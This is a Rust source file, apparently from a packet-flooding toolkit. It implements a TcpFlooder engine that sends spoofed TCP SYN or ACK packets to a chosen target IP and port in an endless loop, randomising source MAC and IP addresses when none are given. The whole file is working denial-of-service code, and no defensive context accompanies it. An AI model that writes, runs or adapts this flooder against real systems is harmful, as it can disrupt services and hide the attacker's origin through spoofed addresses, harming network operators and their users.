use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::{net::Ipv4Addr};
use crate::engines::TcpArgs;
use crate::builders::Packets;
use crate::generators::RandomValues;
use crate::iface::IfaceInfo;
use crate::sockets::Layer2Socket;
use crate::utils::{inline_display, get_first_and_last_ip, TypeConverter, CtrlCHandler, resolve_mac};



pub struct TcpFlooder {
    args      : TcpArgs,
    builder   : Packets,
    iface     : String,
    pkt_data  : PacketData,
    pkts_sent : usize,
    rand      : RandomValues,
}


impl TcpFlooder {

    pub fn new(args: TcpArgs) -> Self {
        let iface               = IfaceInfo::iface_from_ip(args.dst_ip);
        let (first_ip, last_ip) = get_first_and_last_ip(&iface);

        Self {
            args,
            iface,
            builder   : Packets::new(),
            pkt_data  : PacketData::new(),
            pkts_sent : 0,
            rand      : RandomValues::new(Some(first_ip), Some(last_ip)),
        }
    }



    pub fn execute(&mut self){
        self.set_pkt_data();
        self.display_pkt_data();
        self.send_endlessly();
    }



    fn set_pkt_data(&mut self) {
        self.pkt_data.src_ip   = self.args.src_ip;
        self.pkt_data.src_mac  = resolve_mac(self.args.src_mac.clone(), &self.iface);
        self.pkt_data.dst_port = self.args.port;
        
        self.pkt_data.dst_ip   = self.args.dst_ip;
        let dst_mac            = resolve_mac(Some(self.args.dst_mac.clone()), &self.iface);
        self.pkt_data.dst_mac  = dst_mac.unwrap();
        self.pkt_data.flag     = if self.args.ack {"ack".to_string()} else {"syn".to_string()};
    }


    
    fn display_pkt_data(&self) {
        let src_mac = match self.pkt_data.src_mac {
            Some(mac) => TypeConverter::mac_vec_u8_to_string(&mac),
            None      => "Random".to_string(),
        };

        let src_ip = match self.pkt_data.src_ip {
            Some(ip) => ip.to_string(),
            None     => "Random".to_string(),
        };

        let dst_mac = TypeConverter::mac_vec_u8_to_string(&self.pkt_data.dst_mac);

        println!("SRC >> MAC: {}  IP: {}", src_mac, src_ip);
        println!("DST >> MAC: {}  IP: {}", dst_mac, self.pkt_data.dst_ip);
        println!("IFACE: {}", self.iface);
    }



    fn send_endlessly(&mut self) {
        let socket  = Layer2Socket::new(&self.iface);
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            let pkt = self.get_pkt();
            socket.send(pkt);

            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }

        println!("\nFlood interrupted");
    }


    
    #[inline]
    fn get_pkt(&mut self) -> &[u8] {
        self.builder.tcp_ether(
            self.pkt_data.src_mac.unwrap_or_else(|| self.rand.random_mac()), 
            self.pkt_data.src_ip.unwrap_or_else( || self.rand.random_ip()), 
            self.rand.random_port(),
            self.pkt_data.dst_mac, 
            self.pkt_data.dst_ip,
            self.pkt_data.dst_port,
            &self.pkt_data.flag
        )
    }

}



impl crate::EngineTrait for TcpFlooder {
    type Args = TcpArgs;
    
    fn new(args: Self::Args) -> Self {
        TcpFlooder::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}



struct PacketData {
    src_ip   : Option<Ipv4Addr>,
    src_mac  : Option<[u8; 6]>,
    dst_ip   : Ipv4Addr,
    dst_mac  : [u8; 6],
    dst_port : u16,
    flag     : String,
}


impl PacketData {
    fn new() -> Self {
        Self {
            src_ip   : None,
            src_mac  : None,
            dst_ip   : Ipv4Addr::new(0, 0, 0, 0),
            dst_mac  : [0u8; 6],
            dst_port : 0,
            flag     : "".to_string(),
        }
    }
}